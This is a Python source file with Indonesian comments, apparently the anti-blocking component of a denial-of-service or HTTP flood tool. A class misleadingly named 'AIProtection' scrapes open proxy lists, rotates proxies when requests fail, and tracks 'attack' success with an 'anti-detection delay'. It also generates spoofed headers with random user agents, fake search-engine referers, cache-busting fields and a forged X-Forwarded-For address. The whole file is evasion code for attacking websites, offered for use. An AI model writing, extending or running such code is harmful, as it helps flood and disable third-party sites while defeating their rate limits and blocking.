import requests
import random
import time

# AI Protection System
class AIProtection:
    def __init__(self):
        self.failed_requests = 0
        self.successful_requests = 0
        self.current_proxy = None
        self.proxy_list = self.load_proxies()

    # Load Proxy
    def load_proxies(self):
        proxy_sources = [
            "https://www.proxy-list.download/api/v1/get?type=http",
            "https://www.proxy-list.download/api/v1/get?type=https",
            "https://www.proxy-list.download/api/v1/get?type=socks5"
        ]
        proxies = []
        for url in proxy_sources:
            try:
                response = requests.get(url, timeout=3)
                if response.status_code == 200:
                    proxies += response.text.strip().split("\n")
            except:
                pass
        return proxies

    # Pilih proxy acak
    def get_proxy(self):
        if not self.proxy_list:
            self.proxy_list = self.load_proxies()
        self.current_proxy = random.choice(self.proxy_list) if self.proxy_list else None
        return {"http": "http://" + self.current_proxy} if self.current_proxy else None

    # Pemantauan serangan
    def monitor_attack(self, success):
        if success:
            self.successful_requests += 1
            self.failed_requests = 0
        else:
            self.failed_requests += 1

        # Jika 5 request gagal berturut-turut, ganti proxy
        if self.failed_requests >= 5:
            print(" Terlalu banyak kegagalan! Mengganti proxy...")
            self.current_proxy = self.get_proxy()
            self.failed_requests = 0

        # Jika serangan berhasil banyak, optimasi thread
        if self.successful_requests >= 10:
            print(" Serangan sukses besar! Meningkatkan kecepatan...")
            time.sleep(random.uniform(0.1, 0.3))  # Anti-detection delay

    # Anti-Blocking AI
    def generate_headers(self, target_url):
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/537.36"
        ]
        referers = [
            "https://www.google.com/search?q=",
            "https://www.bing.com/search?q=",
            "https://duckduckgo.com/?q=",
            "https://www.yahoo.com/search?p=",
            "https://www.facebook.com/sharer/sharer.php?u="
        ]
        return {
            "User-Agent": random.choice(user_agents),
            "Referer": random.choice(referers) + target_url,
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        }